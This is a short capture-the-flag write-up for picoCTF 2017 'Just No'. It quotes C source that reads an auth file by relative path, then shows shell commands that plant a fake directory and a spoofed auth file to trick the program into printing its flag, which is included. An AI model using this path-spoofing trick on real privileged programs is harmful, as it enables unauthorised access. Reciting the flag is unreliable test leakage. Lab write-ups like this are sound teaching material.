# picoCTF 2017: Just No

**Level:** 1 **Category:** BINARY_EXPLOITATION **Point:** 40 **Description:**

>A program at /problems/ab718be873f8a7efe966f4ed5af749eb has access to a flag but refuses to share it. Can you convince it otherwise?

**Hint:**

>Check out the difference between relative and absolute paths and see if you can figure out how to use them to solve this challenge. Could you possibly spoof another auth file it looks at instead...?

## Write-up

``` 
$ cd /problems/ab718be873f8a7efe966f4ed5af749eb
ls
auth
flag
justno
justno.c
$ ./justno
auth file says no. So no. Just... no.
$ vim justno.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){
  FILE* authf = fopen("../../problems/ab718be873f8a7efe966f4ed5af749eb/auth","r"
); //access auth file in ../../../problems/ab718be873f8a7efe966f4ed5af749eb
  if(authf == NULL){
    printf("could not find auth file in ../../problems/ab718be873f8a7efe966f4ed5
af749eb/\n");
    return 0;
  }
  char auth[8];
  fgets(auth,8,authf);
  fclose(authf);
  if(strcmp(auth,"no")!=0){
    FILE* flagf;
    flagf = fopen("/problems/ab718be873f8a7efe966f4ed5af749eb/flag","r");
    char flag[64];
    fgets(flag,64,flagf);

```

This program use relative paths. So I just need add a fake path and a fake `auth` file.

```
$ cd ~
$ mkdir problems
$ mkdir problems/ab718be873f8a7efe966f4ed5af749eb
$ cd problems/ab718be873f8a7efe966f4ed5af749eb
$ echo "yes" > auth
$ /problems/ab718be873f8a7efe966f4ed5af749eb/justno
Oh. Well the auth file doesn't say no anymore so... Here's the flag: 3a7cbd7c24f7d5369308333b045382e7
```

So the flag is `3a7cbd7c24f7d5369308333b045382e7`.